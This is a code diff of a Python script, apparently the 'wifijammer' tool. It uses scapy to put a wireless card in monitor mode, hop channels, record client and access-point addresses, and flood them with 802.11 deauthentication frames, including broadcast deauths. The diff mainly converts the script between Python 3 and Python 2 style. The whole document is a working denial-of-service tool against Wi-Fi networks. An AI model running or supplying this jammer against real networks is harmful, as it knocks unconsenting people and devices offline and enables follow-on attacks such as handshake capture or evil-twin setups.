@@ -1,128 +1,42 @@
 #!/usr/bin/env python
 
-from scapy.layers.dot11 import Dot11, Dot11Deauth, Dot11Beacon
-from scapy.layers.dot11 import Dot11Elt, Dot11ProbeResp
-from scapy.all import conf
-from scapy.all import send
-from scapy.all import sniff
-from scapy.themes import Color as ScapyColor
+import logging
+logging.getLogger("scapy.runtime").setLevel(logging.ERROR) # Shut up Scapy
+from scapy.all import *
+conf.verb = 0 # Scapy I thought I told you to shut up
 import os
 import sys
+import time
+from threading import Thread, Lock
 from subprocess import Popen, PIPE
 from signal import SIGINT, signal
-from threading import Thread, Lock
 import argparse
 import socket
 import struct
 import fcntl
-import time
-import re
-import logging
 
-logging.getLogger("scapy.runtime").setLevel(logging.ERROR)  # Shut up Scapy
-conf.verb = 0  # Scapy I thought I told you to shut up
-
-
-class Colors(ScapyColor):
-    """Simple Class structure that extends the scapy colors with some common
-    functions"""
-
-    # Adding Tan to the mix
-    tan = '\033[93m'
-    white = ScapyColor.normal
-
-    # Simple format functions that return a string in a certain color
-    @staticmethod
-    def format_string(content="", color=ScapyColor.normal):
-        """Returns a string with with the formatted color"""
-        return str(color) + content + Colors.white
-
-    @staticmethod
-    def format_green(content=""):
-        """Return a green formatted string"""
-        return Colors.format_string(content, Colors.green)
-
-    @staticmethod
-    def format_orange(content=""):
-        """Return an orange formatted string"""
-        return Colors.format_string(content, Colors.green)
-
-    @staticmethod
-    def format_tan(content=""):
-        """Return an orange formatted string"""
-        return Colors.format_string(content, Colors.tan)
-
-    # Common headers
-    @staticmethod
-    def star(color=ScapyColor.green):
-        """Returns star header [*] with the '*' the passed in color."""
-        return '[' + Colors.format_string("*", color) + ']'
-
-    @staticmethod
-    def plus(color=ScapyColor.green):
-        """Returns star header [+] with the '*' the passed in color."""
-        return '[' + Colors.format_string("+", color) + ']'
-
-    @staticmethod
-    def dash(color=ScapyColor.green):
-        """Returns star header [-] with the '*' the passed in color."""
-        return '[' + Colors.format_string("-", color) + ']'
-
-    @staticmethod
-    def exp(color=ScapyColor.red):
-        """Returns star header [-] with the '*' the passed in color."""
-        return '[' + Colors.format_string("!", color) + ']'
-
+# Console colors
+W  = '\033[0m'  # white (normal)
+R  = '\033[31m' # red
+G  = '\033[32m' # green
+O  = '\033[33m' # orange
+B  = '\033[34m' # blue
+P  = '\033[35m' # purple
+C  = '\033[36m' # cyan
+GR = '\033[37m' # gray
+T  = '\033[93m' # tan
 
 def parse_args():
-    """Parse the arguments of the call."""
+	#Create the arguments
     parser = argparse.ArgumentParser()
-    parser.add_argument("-s",
-                        "--skip",
-                        help=("Skip deauthing this MAC address. "
-                              "Example: -s 00:11:BB:33:44:AA"))
-    parser.add_argument("-i",
-                        "--interface",
-                        help=("Choose monitor mode interface. By default the "
-                              "script will find the most powerful interface "
-                              "and starts monitor mode on it. "
-                              "Example: -i mon5"))
-    parser.add_argument("-c",
-                        "--channel",
-                        help=("Listen on and deauth only clients on the "
-                              "specified channel. Example: -c 6"))
-    parser.add_argument("-m",
-                        "--maximum",
-                        help=("Choose the maximum number of clients to "
-                              "deauth. List of clients will be emptied and "
-                              "repopulated after hitting the limit. "
-                              "Example: -m 5"))
-    parser.add_argument("-n",
-                        "--noupdate",
-                        help=("Do not clear the deauth list when the maximum "
-                              "(-m) number of client/AP combos is reached. "
-                              "Must be used in conjunction with -m. "
-                              "Example: -m 10 -n"),
-                        action='store_true')
-    parser.add_argument("-t",
-                        "--timeinterval",
-                        help=("Choose the time interval between packets being "
-                              "sent. Default is as fast as possible. If you "
-                              "see scapy errors like 'no buffer "
-                              "space' try: -t .00001"))
-    parser.add_argument("-p",
-                        "--packets",
-                        help=("Choose the number of packets to send in each "
-                              "deauth burst. Default value is 1; 1 packet to "
-                              "the client and 1 packet to the AP. Send 2 "
-                              "deauth packets to the client and 2 deauth "
-                              "packets to the AP: -p 2"))
-    parser.add_argument("-d",
-                        "--directedonly",
-                        help=("Skip the deauthentication packets to the "
-                              "broadcast address of the access points and "
-                              "only send them to client/AP pairs"),
-                        action='store_true')
+    parser.add_argument("-s", "--skip", help="Skip deauthing this MAC address. Example: -s 00:11:BB:33:44:AA")
+    parser.add_argument("-i", "--interface", help="Choose monitor mode interface. By default script will find the most powerful interface and starts monitor mode on it. Example: -i mon5")
+    parser.add_argument("-c", "--channel", help="Listen on and deauth only clients on the specified channel. Example: -c 6")
+    parser.add_argument("-m", "--maximum", help="Choose the maximum number of clients to deauth. List of clients will be emptied and repopulated after hitting the limit. Example: -m 5")
+    parser.add_argument("-n", "--noupdate", help="Do not clear the deauth list when the maximum (-m) number of client/AP combos is reached. Must be used in conjunction with -m. Example: -m 10 -n", action='store_true')
+    parser.add_argument("-t", "--timeinterval", help="Choose the time interval between packets being sent. Default is as fast as possible. If you see scapy errors like 'no buffer space' try: -t .00001")
+    parser.add_argument("-p", "--packets", help="Choose the number of packets to send in each deauth burst. Default value is 1; 1 packet to the client and 1 packet to the AP. Send 2 deauth packets to the client and 2 deauth packets to the AP: -p 2")
+    parser.add_argument("-d", "--directedonly", help="Skip the deauthentication packets to the broadcast address of the access points and only send them to client/AP pairs", action='store_true')
     return parser.parse_args()
 
 
@@ -141,24 +55,21 @@ def get_mon_iface(args):
         return monitors[0]
     else:
         # Start monitor mode on a wireless interface
-        print(Colors.star(Colors.green) +
-              ' Finding the most powerful interface...')
+        print '['+G+'*'+W+'] Finding the most powerful interface...'
         interface = get_iface(interfaces)
         monmode = start_mon_mode(interface)
         return monmode
-
 
 def iwconfig():
     monitors = []
     interfaces = {}
     proc = Popen(['iwconfig'], stdout=PIPE, stderr=DN)
     for line in proc.communicate()[0].split('\n'):
-        if len(line) == 0:
-            continue  # Isn't an empty string
-        if line[0] != ' ':  # Doesn't start with space
+        if len(line) == 0: continue # Isn't an empty string
+        if line[0] != ' ': # Doesn't start with space
             wired_search = re.search('eth[0-9]|em[0-9]|p[1-9]p[1-9]', line)
-            if not wired_search:  # Isn't wired
-                iface = line[:line.find(' ')]  # is the interface
+            if not wired_search: # Isn't wired
+                iface = line[:line.find(' ')] # is the interface
                 if 'Mode:Monitor' in line:
                     monitors.append(iface)
                 elif 'IEEE 802.11' in line:
@@ -168,15 +79,11 @@ def iwconfig():
                         interfaces[iface] = 0
     return monitors, interfaces
 
-
 def get_iface(interfaces):
-    """From the list of interfaces passed in return te interface with the
-    highest number of APs on it"""
     scanned_aps = []
 
     if len(interfaces) < 1:
-        sys.exit(Colors.dash(Colors.red) + ' '
-                 'No wireless interfaces found, bring one up and try again')
+        sys.exit('['+R+'-'+W+'] No wireless interfaces found, bring one up and try again')
     if len(interfaces) == 1:
         for interface in interfaces:
             return interface
@@ -186,60 +93,43 @@ def get_iface(interfaces):
         count = 0
         proc = Popen(['iwlist', iface, 'scan'], stdout=PIPE, stderr=DN)
         for line in proc.communicate()[0].split('\n'):
-            if ' - Address:' in line:  # first line in iwlist scan for a new AP
-                count += 1
+            if ' - Address:' in line: # first line in iwlist scan for a new AP
+               count += 1
         scanned_aps.append((count, iface))
-        print(Colors.plus(Colors.red) + ' Networks discovered by ' +
-              Colors.format_green(iface) + ': ' + Colors.format_tan(count))
+        print '['+G+'+'+W+'] Networks discovered by '+G+iface+W+': '+T+str(count)+W
     try:
         interface = max(scanned_aps)[1]
-        if interfaces[interface] == 1:
-            raw_input(Colors.dash(Colors.red) + ' Disconnect ' +
-                      Colors.format_green(interface) + ' '
-                      'from its network or channel hopping will fail. '
-                      'When done hit [ENTER]')
         return interface
     except Exception as e:
         for iface in interfaces:
             interface = iface
-            print(Colors.dash(Colors.red) + ' Minor error:', e)
-            print('    Starting monitor mode on ' +
-                  Colors.format_green(interface))
+            print '['+R+'-'+W+'] Minor error:',e
+            print '    Starting monitor mode on '+G+interface+W
             return interface
 
-
 def start_mon_mode(interface):
-    """Starts Monitor Mode in the passed in interface"""
-
-    print(Colors.plus(Colors.green) + ' Starting monitor mode on ' +
-          Colors.format_green(interface))
+    print '['+G+'+'+W+'] Starting monitor mode on '+G+interface+W
     try:
         os.system('ifconfig %s down' % interface)
         os.system('iwconfig %s mode monitor' % interface)
         os.system('ifconfig %s up' % interface)
         return interface
     except Exception:
-        sys.exit(Colors.dash(Colors.red) +
-                 ' Could not start monitor mode')
-
+        sys.exit('['+R+'-'+W+'] Could not start monitor mode')
 
 def remove_mon_iface(mon_iface):
-    """Removes the monitor interface"""
     os.system('ifconfig %s down' % mon_iface)
     os.system('iwconfig %s mode managed' % mon_iface)
     os.system('ifconfig %s up' % mon_iface)
 
-
 def mon_mac(mon_iface):
-    """
+    '''
     http://stackoverflow.com/questions/159137/getting-mac-address
-    """
+    '''
     s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
     info = fcntl.ioctl(s.fileno(), 0x8927, struct.pack('256s', mon_iface[:15]))
     mac = ''.join(['%02x:' % ord(char) for char in info[18:24]])[:-1]
-    print(Colors.star(Colors.green) + ' Monitor mode: ' +
-          Colors.format_green(mon_iface) + ' - ' +
-          Colors.format_orange(mac))
+    print '['+G+'*'+W+'] Monitor mode: '+G+mon_iface+W+' - '+O+mac+W
     return mac
 
 ########################################
@@ -248,11 +138,10 @@ def mon_mac(mon_iface):
 
 
 def channel_hop(mon_iface, args):
-    """
-    First time it runs through the channels it stays on each channel for 5
-    seconds in order to populate the deauth list nicely. After that it goes as
-    fast as it can
-    """
+    '''
+    First time it runs through the channels it stays on each channel for 5 seconds
+    in order to populate the deauth list nicely. After that it goes as fast as it can
+    '''
     global monchannel, first_pass
     channelNum = 0
     while 1:
@@ -260,41 +149,30 @@ def channel_hop(mon_iface, args):
             with lock:
                 monchannel = args.channel
         else:
-            channelNum += 1
+            channelNum +=1
             if channelNum > 11:
                 channelNum = 1
                 with lock:
                     first_pass = 0
             with lock:
                 monchannel = str(channelNum)
-        proc = Popen(['iw', 'dev', mon_iface, 'set', 'channel', monchannel],
-                     stdout=DN, stderr=PIPE)
+        proc = Popen(['iw', 'dev', mon_iface, 'set', 'channel', monchannel], stdout=DN, stderr=PIPE)
         err = None
         for line in proc.communicate()[1].split('\n'):
-            # iw dev shouldnt display output unless there's an error
-            if len(line) > 2:
-                err = ('[' + Colors.red + '-' + Colors.white +
-                       '] Channel hopping failed: ' + Colors.red + line +
-                       Colors.white + '\n' +
-                       '    Try disconnecting the monitor mode\'s parent '
-                       'interface (e.g. wlan0)\n'
-                       '    from the network if you have not already\n')
+            if len(line) > 2: # iw dev shouldnt display output unless there's an error
+                err = '['+R+'-'+W+'] Channel hopping failed: '+R+line+W
 
         output(err, monchannel)
         deauth(monchannel)
         if first_pass == 1:
             time.sleep(1)
-        else:
-            # time.sleep(1)
-            pass
-
 
 def deauth(monchannel):
-    """
-    addr1=destination, addr2=source, addr3=bssid, addr4=bssid of gateway if
-    there's multi-APs to one gateway. Constantly scans the clients_APs list and
+    '''
+    addr1=destination, addr2=source, addr3=bssid, addr4=bssid of gateway if there's
+    multi-APs to one gateway. Constantly scans the clients_APs list and
     starts a thread to deauth each instance
-    """
+    '''
     global first_pass
     if first_pass == 1:
         return
@@ -305,16 +183,13 @@ def deauth(monchannel):
                 client = x[0]
                 ap = x[1]
                 ch = x[2]
-                # Can't add a RadioTap() layer as the first layer or it's a
-                # malformed
+                # Can't add a RadioTap() layer as the first layer or it's a malformed
                 # Association request packet?
-                # Append the packets to a new list so we don't have to hog the
-                # lock type=0, subtype=12?
+                # Append the packets to a new list so we don't have to hog the lock
+                # type=0, subtype=12?
                 if ch == monchannel:
-                    deauth_pkt1 = Dot11(
-                        addr1=client, addr2=ap, addr3=ap) / Dot11Deauth()
-                    deauth_pkt2 = Dot11(
-                        addr1=ap, addr2=client, addr3=client) / Dot11Deauth()
+                    deauth_pkt1 = Dot11(addr1=client, addr2=ap, addr3=ap)/Dot11Deauth()
+                    deauth_pkt2 = Dot11(addr1=ap, addr2=client, addr3=client)/Dot11Deauth()
                     pkts.append(deauth_pkt1)
                     pkts.append(deauth_pkt2)
     if len(APs) > 0:
@@ -324,10 +199,7 @@ def deauth(monchannel):
                     ap = a[0]
                     ch = a[1]
                     if ch == monchannel:
-                        deauth_ap = Dot11(addr1='ff:ff:ff:ff:ff:ff',
-                                          addr2=ap,
-                                          addr3=ap)
-                        Dot11Deauth()
+                        deauth_ap = Dot11(addr1='ff:ff:ff:ff:ff:ff', addr2=ap, addr3=ap)/Dot11Deauth()
                         pkts.append(deauth_ap)
 
     if len(pkts) > 0:
@@ -339,49 +211,37 @@ def deauth(monchannel):
 
         for p in pkts:
             send(p, inter=float(args.timeinterval), count=int(args.packets))
-            # pass
-
+            #pass
+        #time.sleep(.5)
 
 def output(err, monchannel):
-    """Prints out the Channel"""
     os.system('clear')
-
     if err:
-        print(err)
+        print err
     else:
-        print(Colors.plus(Colors.green) + ' ' + mon_iface +
-              ' channel: ' + Colors.green + monchannel + Colors.white + '\n')
-
+        print '['+G+'+'+W+'] '+mon_iface+' channel: '+G+monchannel+W+'\n'
     if len(clients_APs) > 0:
-        print('                  Deauthing                 ch   ESSID')
-
+        print '                  Deauthing                 ch   ESSID'
     # Print the deauth list
     with lock:
         for ca in clients_APs:
             if len(ca) > 3:
-                print(Colors.star(Colors.tan) + ' ' +
-                      Colors.format_orange(ca[0]) + ' - ' +
-                      Colors.format_orange(ca[1]) + ' - ' + ca[2].ljust(2) +
-                      ' - ' + Colors.format_tan(ca[3]))
+                print '['+T+'*'+W+'] '+O+ca[0]+W+' - '+O+ca[1]+W+' - '+ca[2].ljust(2)+' - '+T+ca[3]+W
             else:
-                print(Colors.star(Colors.tan) + ' ' +
-                      Colors.format_orange(ca[0]) + ' - ' +
-                      Colors.format_orange(ca[1]) + ' - ' + ca[2])
+                print '['+T+'*'+W+'] '+O+ca[0]+W+' - '+O+ca[1]+W+' - '+ca[2]
     if len(APs) > 0:
-        print('\n      Access Points     ch   ESSID')
+        print '\n      Access Points     ch   ESSID'
     with lock:
         for ap in APs:
-            print(Colors.star(Colors.tan) + ' ' + Colors.format_orange(ap[0]) +
-                  ' - ' + ap[1].ljust(2) + ' - ' + Colors.format_tan(ap[2]))
-    print()
-
+            print '['+T+'*'+W+'] '+O+ap[0]+W+' - '+ap[1].ljust(2)+' - '+T+ap[2]+W
+    print ''
 
 def cb(pkt):
-    """
+    '''
     Look for dot11 packets that aren't to or from broadcast address,
     are type 1 or 2 (control, data), and append the addr1 and addr2
     to the list of deauth targets.
-    """
+    '''
     global clients_APs, APs
 
     # return these if's keeping clients_APs the same or just reset clients_APs?
@@ -396,16 +256,13 @@ def cb(pkt):
                     clients_APs = []
                     APs = []
 
-    # Broadcast, broadcast, IPv6mcast, spanning tree, spanning tree,
-    # multicast, broadcast
-    ignore = ['ff:ff:ff:ff:ff:ff', '00:00:00:00:00:00', '33:33:00:',
-              '33:33:ff:', '01:80:c2:00:00:00', '01:00:5e:', mon_MAC]
+    # Broadcast, broadcast, IPv6mcast, spanning tree, spanning tree, multicast, broadcast
+    ignore = ['ff:ff:ff:ff:ff:ff', '00:00:00:00:00:00', '33:33:00:', '33:33:ff:', '01:80:c2:00:00:00', '01:00:5e:', mon_MAC]
     if args.skip:
         ignore.append(args.skip)
 
-    # We're adding the AP and channel to the deauth list at time of creation
-    # rather than updating on the fly in order to avoid costly for loops that
-    # require a lock
+    # We're adding the AP and channel to the deauth list at time of creation rather
+    # than updating on the fly in order to avoid costly for loops that require a lock
     if pkt.haslayer(Dot11):
         if pkt.addr1 and pkt.addr2:
             if pkt.haslayer(Dot11Beacon) or pkt.haslayer(Dot11ProbeResp):
@@ -419,10 +276,9 @@ def cb(pkt):
             if pkt.type in [1, 2]:
                 clients_APs_add(clients_APs, pkt.addr1, pkt.addr2)
 
-
 def APs_add(clients_APs, APs, pkt):
-    ssid = pkt[Dot11Elt].info
-    bssid = pkt[Dot11].addr3
+    ssid       = pkt[Dot11Elt].info
+    bssid      = pkt[Dot11].addr3
     try:
         # Thanks to airoscapy for below
         ap_channel = str(ord(pkt[Dot11Elt:3].info))
@@ -430,7 +286,7 @@ def APs_add(clients_APs, APs, pkt):
         chans = ['1', '2', '3', '4', '5', '6', '7', '8', '9', '10', '11']
         if ap_channel not in chans:
             return
-    except Exception:
+    except Exception as e:
         return
 
     if len(APs) == 0:
@@ -442,7 +298,6 @@ def APs_add(clients_APs, APs, pkt):
                 return
         with lock:
             return APs.append([bssid, ap_channel, ssid])
-
 
 def clients_APs_add(clients_APs, addr1, addr2):
     if len(clients_APs) == 0:
@@ -464,29 +319,23 @@ def clients_APs_add(clients_APs, addr1, addr2):
             with lock:
                 return clients_APs.append([addr1, addr2, monchannel])
 
-
 def AP_check(addr1, addr2):
     for ap in APs:
         if ap[0].lower() in addr1.lower() or ap[0].lower() in addr2.lower():
             with lock:
                 return clients_APs.append([addr1, addr2, ap[1], ap[2]])
 
-
 def stop(signal, frame):
-
-    if not monitor_on:
+    if monitor_on:
+        sys.exit('\n['+R+'!'+W+'] Closing')
+    else:
         remove_mon_iface(mon_iface)
-
-    sys.exit('\n' + Colors.exp() + ' Closing')
+        sys.exit('\n['+R+'!'+W+'] Closing')
 
 
 if __name__ == "__main__":
-    """Main Function"""
-
-    # Ensure that the program has root privaledges
     if os.geteuid():
-        sys.exit(Colors.dash(Colors.red) + ' Please run as root')
-
+        sys.exit('['+R+'-'+W+'] Please run as root')
     clients_APs = []
     APs = []
     DN = open(os.devnull, 'w')
@@ -506,7 +355,8 @@ if __name__ == "__main__":
     signal(SIGINT, stop)
 
     try:
-        sniff(iface=mon_iface, store=0, prn=cb)
+       sniff(iface=mon_iface, store=0, prn=cb)
     except Exception as msg:
-        print('\n' + Colors.exp() + ' Closing:', msg)
+        remove_mon_iface(mon_iface)
+        print '\n['+R+'!'+W+'] Closing'
         sys.exit(0)
